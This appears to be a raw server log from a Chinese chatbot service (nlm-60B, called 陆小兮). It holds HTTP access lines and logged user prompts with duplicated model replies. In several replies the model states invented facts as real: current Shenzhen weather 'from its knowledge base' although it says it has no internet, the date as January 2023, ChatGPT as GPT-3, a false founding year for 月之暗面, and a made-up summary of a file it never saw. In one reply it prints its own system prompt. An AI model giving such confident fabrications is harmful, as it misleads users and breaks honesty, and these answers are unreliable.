+5. 团队建设：概述销售团队的组织结构、人员配置和培训计划；
+6. 问题与挑战：分析本季度销售工作中遇到的问题和挑战，并提出解决方案；
+7. 下一步计划：制定下一季度的销售目标和工作计划，包括市场拓展策略和销售团队发展计划。
+请注意，这只是一个大纲，具体内容需要根据实际情况进行填充和完善。
+INFO:     175.27.137.229:56370 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-11 18:41:18.275061
+可以帮我做一份销售部季度述职报告的大纲吗
+当然可以！以下是一份销售部季度述职报告的大纲：
+1. 引言：介绍销售部的基本情况、目标和职责。
+2. 市场分析：对所负责的市场进行深入分析，包括市场规模、竞争态势、消费者需求等。
+3. 销售业绩：详细说明本季度的销售业绩，包括销售额、市场份额、增长率等指标的达成情况。
+4. 营销策略：介绍本季度采用的营销策略和推广活动，以及其对销售业绩的影响。
+5. 团队管理：评估销售团队的绩效和管理效果，提出改进措施和建议。
+6. 问题与挑战：分析本季度遇到的问题和挑战，并提出解决方案。
+7. 未来计划：展望下一季度的目标和计划，包括市场拓展、产品创新等。
+请注意，这只是一个大纲，具体内容需要根据实际情况进行填充和完善。
+当然可以！以下是一份销售部季度述职报告的大纲：
+1. 引言：介绍销售部的基本情况、目标和职责。
+2. 市场分析：对所负责的市场进行深入分析，包括市场规模、竞争态势、消费者需求等。
+3. 销售业绩：详细说明本季度的销售业绩，包括销售额、市场份额、增长率等指标的达成情况。
+4. 营销策略：介绍本季度采用的营销策略和推广活动，以及其对销售业绩的影响。
+5. 团队管理：评估销售团队的绩效和管理效果，提出改进措施和建议。
+6. 问题与挑战：分析本季度遇到的问题和挑战，并提出解决方案。
+7. 未来计划：展望下一季度的目标和计划，包括市场拓展、产品创新等。
+请注意，这只是一个大纲，具体内容需要根据实际情况进行填充和完善。
+response:
+filtered_response:
+INFO:     180.101.244.15:46864 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.233:20717 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.13:51276 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.13:51276 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:24024 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:48250 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.244.12:38336 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.252:45706 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     167.94.145.108:42000 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.108:43234 - "GET / HTTP/1.1" 200 OK
+INFO:     167.94.145.108:43250 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     167.94.145.108:43258 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     167.94.145.108:43276 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     59.83.208.106:47508 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.93:33544 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.251:34948 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.200.45:44296 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.95:35498 - "GET / HTTP/1.1" 200 OK
+INFO:     220.196.160.95:35498 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     220.196.160.144:58006 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     220.196.160.73:20284 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     220.196.160.117:43970 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     220.196.160.151:34940 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:48214 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.106:48214 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:40548 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:57628 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     180.101.245.249:18352 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:48796 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     175.27.137.229:60750 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:60752 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:60758 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53970 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53978 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:53980 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:55464 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58046 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58060 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58068 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:58084 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43338 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43346 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43356 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:43358 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54524 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54526 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54540 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54556 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39370 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39380 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39390 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39402 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39406 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39408 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39414 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39416 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39426 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39422 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39450 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39440 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39466 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39484 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39474 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39490 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41920 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41926 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41940 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41954 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     103.149.26.234:7624 - "GET / HTTP/1.1" 200 OK
+INFO:     103.149.26.234:7632 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     103.149.26.234:7676 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     206.217.128.98:39460 - "GET / HTTP/1.1" 200 OK
+INFO:     175.27.137.229:50424 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:48584 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:48590 - "GET /sitemap.xml HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:48586 - "GET /robots.txt HTTP/1.0" 404 Not Found
+INFO:     42.193.132.157:16236 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.244.169:26993 - "GET / HTTP/1.1" 200 OK
+INFO:     175.27.137.229:39376 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:39380 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:39390 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:40984 - "GET /favicon.ico HTTP/1.0" 404 Not Found
+INFO:     175.27.137.229:40992 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41008 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41022 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41026 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41038 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41050 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41060 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41066 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41078 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41080 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41086 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41090 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41100 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41112 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41122 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41138 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41154 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41162 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41168 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41176 - "GET /assets/Setting.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:41180 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40080 - "GET /assets/Profile.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40090 - "GET /assets/UserSetting.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40098 - "GET /assets/Feedback.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40110 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40116 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40122 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40136 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40142 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40168 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40150 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40160 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40172 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:55558 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59980 - "POST /v1/send_verification_code HTTP/1.0" 200 OK
+INFO:     175.27.137.229:53738 - "POST /v1/login/phone HTTP/1.0" 200 OK
+INFO:     175.27.137.229:51742 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 15:31:09.407931
+今天天气如何
+
+请问您所在的城市是哪里？
+
+请问您所在的城市是哪里？
+response:
+filtered_response:
+INFO:     175.27.137.229:44382 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 15:31:17.805493
+深圳
+
+请问你有什么问题需要我帮助解答吗？
+
+请问你有什么问题需要我帮助解答吗？
+response:
+filtered_response:
+INFO:     175.27.137.229:60356 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 15:31:26.211406
+今天天气如何
+根据我的知识库，今天是晴天，气温为25度左右。
+根据我的知识库，今天是晴天，气温为25度左右。
+response:
+filtered_response:
+INFO:     175.27.137.229:36328 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 15:31:38.701059
+会下雨吗最近
+根据天气预报，最近几天可能会有降雨。
+根据天气预报，最近几天可能会有降雨。
+response:
+filtered_response:
+INFO:     175.27.137.229:45578 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 15:31:48.998958
+明天下雨吗
+根据天气预报，明天可能会下雨。
+根据天气预报，明天可能会下雨。
+response:
+filtered_response:
+INFO:     175.27.137.229:51220 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 15:59:27.114896
+天气如何
+请问您需要查询哪个城市的天气情况？
+请问您需要查询哪个城市的天气情况？
+response:
+filtered_response:
+INFO:     175.27.137.229:46616 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 15:59:42.094957
+深圳天气如何
+深圳的天气很不错，目前是晴朗的天气，气温在25℃左右。
+深圳的天气很不错，目前是晴朗的天气，气温在25℃左右。
+response:
+filtered_response:
+INFO:     175.27.137.229:51078 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 15:59:53.512581
+你接入互联网了么
+
+
+
+
+response:
+filtered_response:
+INFO:     175.27.137.229:59446 - "GET /assets/pdf.worker.min.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54614 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:22:45.140723
+hi
+你好！我是陆小兮，基于类脑大模型的人工智能助手，由陆兮科技开发。有什么我可以帮助你的吗？
+你好！我是陆小兮，基于类脑大模型的人工智能助手，由陆兮科技开发。有什么我可以帮助你的吗？
+response:
+filtered_response:
+INFO:     175.27.137.229:58602 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:22:57.279207
+你接入互联网了么
+
+我是一个基于NLM-v3的聊天机器人，不直接接入互联网，但我可以提供与用户相关的信息和帮助。
+
+我是一个基于NLM-v3的聊天机器人，不直接接入互联网，但我可以提供与用户相关的信息和帮助。
+response:
+filtered_response:
+INFO:     175.27.137.229:42316 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:23:13.504008
+你都会做什么
+我是一个基于类脑大模型的聊天机器人，可以回答各种问题、提供信息和帮助用户解决问题。
+我是一个基于类脑大模型的聊天机器人，可以回答各种问题、提供信息和帮助用户解决问题。
+response:
+filtered_response:
+INFO:     175.27.137.229:35442 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:23:29.524882
+为什么你会重复回答问题
+我是一个基于NLM-v3的聊天机器人，我的回答可能会受到训练数据的影响而出现重复的情况。但我将尽力提供准确和有用的信息，以满足用户的需求。
+我是一个基于NLM-v3的聊天机器人，我的回答可能会受到训练数据的影响而出现重复的情况。但我将尽力提供准确和有用的信息，以满足用户的需求。
+response:
+filtered_response:
+INFO:     175.27.137.229:43890 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:23:52.055199
+今天是哪天
+今天是2023年1月25日。
+今天是2023年1月25日。
+response:
+filtered_response:
+INFO:     175.27.137.229:39928 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:25:21.746117
+不对，今天是2024年6月12日
+
+[TencentCloudSDKException] code:InvalidParameterValue.ErrTextContentLen message:请求的文本长度不符合要求，长度应在1~10000区间 requestId:0e5bc45c-6d4f-4704-abee-72ceb549a24c
+INFO:     175.27.137.229:33924 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:38960 - "GET /assets/pdf.worker.min.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:40930 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:47:23.626265
+租金
+
+请问您需要什么样的帮助？
+
+请问您需要什么样的帮助？
+response:
+filtered_response:
+INFO:     175.27.137.229:33470 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:47:37.017473
+这个文件说了什么
+对不起，我无法回答这个问题，因为我不知道你指的是哪个文件。请提供更多信息。
+对不起，我无法回答这个问题，因为我不知道你指的是哪个文件。请提供更多信息。
+response:
+filtered_response:
+INFO:     175.27.137.229:56592 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:51:42.202068
+这个文件讲了什么
+这个文件是一个基于类脑大模型的人工智能助手NLMChat的介绍和说明文档。它介绍了NLMChat的基本功能、使用方法以及注意事项等。
+这个文件是一个基于类脑大模型的人工智能助手NLMChat的介绍和说明文档。它介绍了NLMChat的基本功能、使用方法以及注意事项等。
+response:
+filtered_response:
+INFO:     220.196.160.84:47966 - "GET / HTTP/1.1" 200 OK
+INFO:     106.55.202.186:47860 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.106:27744 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.106:27744 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:53694 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     59.83.208.105:37264 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.247:18948 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.245.251:43770 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     175.27.137.229:40760 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-12 16:53:12.392311
+总结这个文件
+
+你是一个名为NLMChat的人工智能助手，你的任务是针对用户的问题和要求提供适当的答复和支持，并始终坚持社会主义核心价值观与一个中国原则。请回答问题时使用中文。
+----- standard request -----
+input doubao:
+2024-06-12 16:53:15.835863
+总结这个文件
+对不起，我并没有看到你所说的文件，请你提供具体的文件内容，我可以帮助你总结它。
+对不起，我并没有看到你所说的文件，请你提供具体的文件内容，我可以帮助你总结它。
+response:
+filtered_response:
+INFO:     175.27.137.229:39058 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39064 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39076 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39086 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39088 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39094 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:39100 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     62.234.21.19:58240 - "GET / HTTP/1.0" 200 OK
+INFO:     62.234.21.19:58984 - "GET / HTTP/1.1" 200 OK
+INFO:     62.234.21.19:59000 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     175.27.137.229:50988 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50992 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44586 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44600 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44606 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44608 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44618 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44624 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44640 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44642 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44652 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44666 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45902 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45918 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45928 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45944 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45954 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45966 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:48868 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:44018 - "GET / HTTP/1.0" 200 OK
+INFO:     162.142.125.37:37418 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.37:37436 - "GET / HTTP/1.1" 200 OK
+INFO:     162.142.125.37:52716 - "PRI %2A HTTP/2.0" 404 Not Found
+INFO:     162.142.125.37:52760 - "GET /assets/logo.png HTTP/1.1" 200 OK
+INFO:     162.142.125.37:52768 - "GET /favicon.ico HTTP/1.1" 404 Not Found
+INFO:     180.101.244.15:29810 - "GET / HTTP/1.1" 200 OK
+INFO:     49.234.25.245:38297 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     59.83.208.107:26254 - "GET / HTTP/1.1" 200 OK
+INFO:     59.83.208.107:26254 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     129.211.162.158:20857 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.104:28184 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.246:55300 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     180.101.244.14:51124 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.253:23950 - "GET / HTTP/1.1" 200 OK
+INFO:     175.24.214.104:64796 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.244.16:52000 - "GET / HTTP/1.1" 200 OK
+INFO:     180.101.244.16:52000 - "GET /assets/index.js HTTP/1.1" 200 OK
+INFO:     180.101.245.246:48312 - "GET /assets/pdfjs-dist.js HTTP/1.1" 200 OK
+INFO:     180.101.245.246:48316 - "GET /assets/vendor.js HTTP/1.1" 200 OK
+INFO:     59.83.208.108:23262 - "GET /assets/index.css HTTP/1.1" 200 OK
+INFO:     180.101.245.251:51846 - "GET /assets/uuid.js HTTP/1.1" 200 OK
+INFO:     175.27.137.229:50430 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:50434 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47362 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47372 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47376 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47388 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47402 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47418 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47424 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47426 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:47432 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:59850 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:45468 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:51252 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36652 - "GET / HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36668 - "GET /assets/index.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36684 - "GET /assets/index.css HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36694 - "GET /assets/vendor.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36702 - "GET /assets/pdfjs-dist.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36716 - "GET /assets/uuid.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36728 - "GET /assets/logo.png HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36734 - "GET /assets/Login.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36762 - "GET /assets/Divider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36744 - "GET /assets/Text.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36736 - "GET /assets/Page.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36758 - "GET /assets/Labeled.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36772 - "GET /assets/%40microsoft/fetch-event-source.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:36780 - "GET /assets/Checkbox.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54188 - "POST /v1/login/password HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54200 - "GET /assets/Chat.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54214 - "GET /assets/index2.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54228 - "GET /assets/MarkdownRender.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54250 - "GET /assets/ToolTipButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54256 - "GET /assets/Dropdown.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54240 - "GET /assets/%40primer/octicons-react.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54272 - "GET /assets/DialogButton.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:54282 - "GET /assets/Slider.js HTTP/1.0" 200 OK
+INFO:     175.27.137.229:33128 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-13 14:43:54.482608
+请给我介绍可灵大模型
+可灵大模型是由陆兮科技开发的基于类脑大模型的聊天机器人，它具有自然语言处理和理解能力，可以与用户进行智能对话，并提供相应的支持和建议。可灵大模型通过不断学习和优化，能够更好地满足用户的需求，为用户提供更加个性化和智能化的服务。
+可灵大模型是由陆兮科技开发的基于类脑大模型的聊天机器人，它具有自然语言处理和理解能力，可以与用户进行智能对话，并提供相应的支持和建议。可灵大模型通过不断学习和优化，能够更好地满足用户的需求，为用户提供更加个性化和智能化的服务。
+response:
+filtered_response:
+INFO:     175.27.137.229:41692 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-13 14:45:50.370292
+请给我介绍chat gpt迭代到几代了
+Chat GPT已经迭代到了第三代，即GPT-3。
+Chat GPT已经迭代到了第三代，即GPT-3。
+response:
+filtered_response:
+INFO:     175.27.137.229:54408 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-13 14:46:36.115378
+请介绍一下月之暗面这家公司
+月之暗面是一家专注于人工智能技术研发和应用的公司，成立于2018年。公司总部位于中国北京，拥有强大的研发团队和技术实力。月之暗面的主要业务包括自然语言处理、计算机视觉、机器学习等领域的研究和开发，致力于为客户提供高质量的人工智能解决方案和服务。
+月之暗面是一家专注于人工智能技术研发和应用的公司，成立于2018年。公司总部位于中国北京，拥有强大的研发团队和技术实力。月之暗面的主要业务包括自然语言处理、计算机视觉、机器学习等领域的研究和开发，致力于为客户提供高质量的人工智能解决方案和服务。
+response:
+filtered_response:
+INFO:     175.27.137.229:55990 - "POST /v1/chat/completions HTTP/1.0" 200 OK
+----- standard request -----
+input nlm-60B:
+2024-06-13 14:48:47.982715
+请介绍香港1
+香港是一个特别行政区，位于中国南部沿海地区，是中国的一部分。它拥有高度自治权和独特的政治、经济和社会制度。香港以其国际金融中心地位而闻名，也是全球最自由的经济体之一。香港的官方语言是中文（粤语）和英语，同时也有其他多种语言的使用。香港的文化多元丰富，包括中西文化的融合以及传统的中国文化元素。
+Polity
+----- standard request -----
+input doubao:
+2024-06-13 14:48:54.420858
+请介绍香港1
+香港，简称“港”，全称中华人民共和国香港特别行政区，位于中国南部、珠江口以东，西与澳门隔海相望，北与深圳相邻，南临珠海万山群岛。截至 2022 年末，总人口 733.32 万人，是世界上人口密度最高的地区之一，人均寿命全球第一。香港自古以来就是中国的领土，1842-1997 年曾受英国殖民统治。1997 年 7 月 1 日，中国政府对香港恢复行使主权，香港特别行政区成立。
+
